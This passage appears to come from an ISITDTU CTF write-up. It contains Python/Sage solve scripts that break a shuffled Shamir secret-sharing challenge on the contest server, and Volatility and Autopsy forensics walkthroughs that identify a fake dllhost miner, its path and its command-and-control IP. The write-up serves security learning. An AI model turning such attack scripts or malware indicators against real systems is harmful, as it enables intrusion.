</span></span><span class="line"><span class="cl">key = unhexlify(key_hex)
</span></span><span class="line"><span class="cl">iv = unhexlify(iv_hex)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ciphertext_bytes = bytes(ciphertext)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">cipher = AES.new(key, AES.MODE_CBC, iv)
</span></span><span class="line"><span class="cl">plaintext = cipher.decrypt(ciphertext_bytes)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">print(&#34;Plaintext:&#34;, plaintext)
</span></span></code></pre></div><p>And we got this
<img src="https://hackmd.io/_uploads/BksKwYRlkl.png" alt="image"></p>
<h2 id="cryptography">
<a class="header-anchor" href="#cryptography"></a>
Cryptography
</h2><h3 id="sharemixer1">
<a class="header-anchor" href="#sharemixer1"></a>
ShareMixer1
</h3><p>It&rsquo;s a SSS cryptosystem but the input is shuffled</p>
<p><img src="https://hackmd.io/_uploads/r1JGYsieJl.png" alt="image"></p>
<p>Along with that, we can query at most 256 numbers</p>
<p><img src="https://hackmd.io/_uploads/SJbrKsilke.png" alt="image"></p>
<p>To address the challenge, a straightforward approach is to send a sequence of 32 unique numbers with the following replication pattern: five numbers appear once, four numbers appear twice, three numbers appear three times, two numbers appear four times, two numbers appear five times, and all the remaning numbers appears once. With that, we need to bruteforce $5!*4!*3!*2!*2!$ in total to get the correct order. At the end, we get 32 corrected equations and a bit of linear algebra to solve</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sage.all</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">itertools</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;35.187.238.100&#39;</span><span class="p">,</span><span class="mi">5001</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;suffix that: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">prefix</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">16</span><span class="p">:</span><span class="mi">32</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">prefix</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">find_suffix</span><span class="p">(</span><span class="n">prefix</span><span class="p">,</span> <span class="n">target</span><span class="o">=</span><span class="s2">&#34;000000&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">length</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">6</span><span class="p">):</span>  
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">suffix</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="n">length</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">suffix</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">suffix</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">attempt</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="n">suffix</span>
</span></span><span class="line"><span class="cl">            <span class="n">hashed_value</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">attempt</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">hashed_value</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">target</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">suffix</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">find_suffix</span><span class="p">(</span><span class="n">prefix</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">l</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">R</span> <span class="o">=</span> <span class="n">Zmod</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">choices</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">l</span><span class="o">+</span><span class="mi">1</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="n">querry</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">querry</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">choices</span><span class="p">[</span><span class="n">_</span><span class="p">])</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">5</span> <span class="o">+</span> <span class="mi">4</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">querry</span> <span class="o">+=</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">choices</span><span class="p">[</span><span class="n">_</span><span class="p">])</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="mi">9</span> <span class="o">+</span> <span class="mi">3</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">querry</span> <span class="o">+=</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">choices</span><span class="p">[</span><span class="n">_</span><span class="p">])</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">12</span> <span class="o">+</span> <span class="mi">2</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">querry</span> <span class="o">+=</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">choices</span><span class="p">[</span><span class="n">_</span><span class="p">])</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">2</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">querry</span> <span class="o">+=</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">choices</span><span class="p">[</span><span class="n">_</span><span class="p">])</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span><span class="p">)</span> <span class="o">*</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl"><span class="n">count</span> <span class="o">=</span> <span class="mi">6</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="mi">32</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">querry</span> <span class="o">+=</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">choices</span><span class="p">[</span><span class="n">_</span><span class="p">])</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span><span class="p">)</span> <span class="o">*</span> <span class="n">count</span>
</span></span><span class="line"><span class="cl">    <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="n">xs</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span><span class="p">,</span> <span class="n">querry</span><span class="o">.</span><span class="n">split</span><span class="p">()))</span>
</span></span><span class="line"><span class="cl"><span class="n">m_query</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">xs</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">m_query</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">m_query</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">m_query</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="n">querry</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">shares</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">shares</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">m</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">m</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">m</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Sort the dictionary based on values</span>
</span></span><span class="line"><span class="cl"><span class="n">ordered_map</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="nb">sorted</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">items</span><span class="p">(),</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">item</span><span class="p">:</span> <span class="n">item</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl"><span class="n">M</span> <span class="o">=</span> <span class="p">[[</span><span class="n">power_mod</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">l</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">-</span> <span class="n">i</span><span class="p">,</span><span class="n">p</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">l</span><span class="p">)]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">l</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="n">M</span> <span class="o">=</span> <span class="n">Matrix</span><span class="p">(</span><span class="n">R</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Separate keys based on their count values</span>
</span></span><span class="line"><span class="cl"><span class="n">value</span> <span class="o">=</span> <span class="p">[</span><span class="n">k</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">ordered_map</span><span class="o">.</span><span class="n">items</span><span class="p">()</span> <span class="k">if</span> <span class="n">v</span> <span class="o">&gt;</span> <span class="mi">5</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">value1</span> <span class="o">=</span> <span class="p">[</span><span class="n">k</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">ordered_map</span><span class="o">.</span><span class="n">items</span><span class="p">()</span> <span class="k">if</span> <span class="n">v</span> <span class="o">==</span> <span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">value2</span> <span class="o">=</span> <span class="p">[</span><span class="n">k</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">ordered_map</span><span class="o">.</span><span class="n">items</span><span class="p">()</span> <span class="k">if</span> <span class="n">v</span> <span class="o">==</span> <span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">value3</span> <span class="o">=</span> <span class="p">[</span><span class="n">k</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">ordered_map</span><span class="o">.</span><span class="n">items</span><span class="p">()</span> <span class="k">if</span> <span class="n">v</span> <span class="o">==</span> <span class="mi">3</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">value4</span> <span class="o">=</span> <span class="p">[</span><span class="n">k</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">ordered_map</span><span class="o">.</span><span class="n">items</span><span class="p">()</span> <span class="k">if</span> <span class="n">v</span> <span class="o">==</span> <span class="mi">4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">value5</span> <span class="o">=</span> <span class="p">[</span><span class="n">k</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">ordered_map</span><span class="o">.</span><span class="n">items</span><span class="p">()</span> <span class="k">if</span> <span class="n">v</span> <span class="o">==</span> <span class="mi">5</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">iterate</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Iterate over permutations and combine them</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">permutations</span><span class="p">(</span><span class="n">value1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">permutations</span><span class="p">(</span><span class="n">value2</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">permutations</span><span class="p">(</span><span class="n">value3</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">permutations</span><span class="p">(</span><span class="n">value4</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">permutations</span><span class="p">(</span><span class="n">value5</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="c1"># Combine all permutations into a single list</span>
</span></span><span class="line"><span class="cl">                    <span class="n">shares_combined</span> <span class="o">=</span> <span class="n">vector</span><span class="p">(</span><span class="n">R</span><span class="p">,</span><span class="nb">list</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">+</span> <span class="nb">list</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">+</span> <span class="nb">list</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">+</span> <span class="nb">list</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="o">+</span> <span class="nb">list</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="o">+</span> <span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    
</span></span><span class="line"><span class="cl">                    <span class="n">res</span> <span class="o">=</span> <span class="n">M</span><span class="o">.</span><span class="n">solve_right</span><span class="p">(</span><span class="n">shares_combined</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="n">iterate</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="n">iterate</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">                    <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;ISITDTU{&#39;</span> <span class="ow">in</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">                            <span class="nb">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">                            <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ISITDTU{Mix1_a5850c98ad583157f0}
</span></span></code></pre></div><h3 id="sharemixer2">
<a class="header-anchor" href="#sharemixer2"></a>
ShareMixer2
</h3><p>This challenge is the same as the previous one but with a small modification: we can just querry at most 32 times. So obviously, we can&rsquo;t use the navie strategy here :( .</p>
<p><img src="https://hackmd.io/_uploads/SkuKTjseJx.png" alt="image"></p>
<p>The solution here is to send 32th root of unitities to the server and caculate the sum of the returned numbers. The we can divide the result by 32 and we get a0. With a bit of luck, we can get flag :v</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sage.all</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;35.187.238.100&#39;</span><span class="p">,</span><span class="mi">5002</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;= &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">R</span> <span class="o">=</span> <span class="n">Zmod</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">P</span> <span class="o">=</span> <span class="n">PolynomialRing</span><span class="p">(</span><span class="n">R</span><span class="p">,</span><span class="s1">&#39;x&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">x</span> <span class="o">=</span> <span class="n">P</span><span class="o">.</span><span class="n">gens</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">q</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,(</span><span class="n">x</span><span class="o">**</span><span class="mi">32</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">roots</span><span class="p">(</span><span class="n">multiplicities</span> <span class="o">=</span> <span class="n">false</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="si">= }</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">str</span><span class="p">,</span> <span class="n">q</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">line</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">readlineS</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">value_str</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;= &#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">value</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">value_str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">mapped_values</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span><span class="n">P</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">summed_value</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="n">mapped_values</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">divided_value</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">summed_value</span> <span class="o">/</span> <span class="mi">32</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">divided_value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="sa">b</span><span class="s2">&#34;ISITDTU{&#34;</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">flag</span> <span class="si">= }</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ISITDTU{M1x_4941n!_73360d0e5fb4}
</span></span></code></pre></div><h2 id="forensics">
<a class="header-anchor" href="#forensics"></a>
Forensics
</h2><h3 id="cpusage">
<a class="header-anchor" href="#cpusage"></a>
CPUsage
</h3><p>In this challenge, we are given a memorydump, which could be from Windows system, and we have to answer the following questions:</p>
<ul>
<li>Name of the malicious process</li>
<li>full path to the executable of the process</li>
<li>PPID</li>
<li>C&amp;C IP</li>
<li>family name of the malware</li>
</ul>
<p>I assumed that the malicious process is currently running when this memorydump is captured, so I run <code>windows.pslist.PsList</code> module of Voltality and immediately found <code>dlIhost.exe</code> - which is a file that fakes the legitimate file <code>dllhost.exe</code>. We also got the PPID <code>264</code>.</p>
<p><img src="https://hackmd.io/_uploads/B11LB6k-ye.png" alt="image"></p>
<p>In order to get the path of the malware, I use <code>windows.filescan.FileScan</code>.</p>
<p><img src="https://hackmd.io/_uploads/SJqTSpJ-Je.png" alt="image"></p>
<p>To get the C&amp;C IP that the malware is connecting to, I use <code>windows.netscan.NetScan</code>.</p>
<p><img src="https://hackmd.io/_uploads/BkBZ86yZye.png" alt="image"></p>
<p>Now, in order to find the malware family, I need to get the malware file itself to push into antivirus detection system and check the signature to determine the family. I use <code>windows.dumpfiles.DumpFiles</code> to get the dump of that executable, then upload to VirusTotal.</p>
<p><img src="https://hackmd.io/_uploads/BJLfvaybJl.png" alt="image">
<img src="https://hackmd.io/_uploads/HJqrv6Jbyl.png" alt="image"></p>
<p>The final flag is: <code>ISITDTU{dlIhost.exe-C:\Users\m4shl3\AppData\Roaming\DLL\dlIhost.exe-264_45.77.240.51-harharminer}</code></p>
<h3 id="corrupted-hard-drive">
<a class="header-anchor" href="#corrupted-hard-drive"></a>
Corrupted Hard Drive
</h3><p><img src="https://hackmd.io/_uploads/rkP3TPnxyx.png" alt="image"></p>
<ol>
<li>Analysis Phase</li>
</ol>
<p>This challenge requires us to address a series of questions to uncover the flag. I&rsquo;ll proceed through each question systematically.</p>
<h4 id="detailed-walkthrough">
<a class="header-anchor" href="#detailed-walkthrough"></a>
Detailed Walkthrough
</h4><blockquote>
<p>Q1. What is the starting address of the LBA address? Format (0xXXXXX)</p></blockquote>
<p>The LBA (Logical Block Addressing) starting address is determined by the offset from the beginning of the disk to the first sector of the partition.</p>
<p>Upon examining the disk structure, I located the partition starting at sector 128. This translates to a starting address of <code>0x10000</code>, which is our answer.</p>
<blockquote>
<p>Q2. What is the tampered OEM ID? Format (0xXXXXXXXXXXXXXXXX)</p></blockquote>
<p>In this task, our goal is to identify the OEM ID. The OEM ID is a unique string indicating the file system type, like NTFS, exFAT, etc.</p>
<p>It is typically located at offset 3 in the file system structure, where we can inspect it to find any alterations.</p>
<p>Here’s an example of how to locate the OEM ID. To do this, I used HxD to open the disk file and navigated to the byte at offset 3.</p>
<p>Answer: <code>0x4E54460020202020</code></p>
<blockquote>
<p>Q3. After Fixing the disk, my friend downloaded a file from Google, what is the exact time when he clicked to download that file?</p></blockquote>
<p>I suspect the files might have been renamed based on the download timestamp. Nonetheless, opening Autopsy and navigating to the &ldquo;Web Downloads&rdquo; feature should help us verify this.</p>
<p><img src="https://hackmd.io/_uploads/HyIOxO3eyx.png" alt="image"></p>
<p>From there, we identify the file as <code>Blue_Team_Notes.pdf</code>, located within the <code>MustRead</code> folder. Let’s navigate to it.</p>
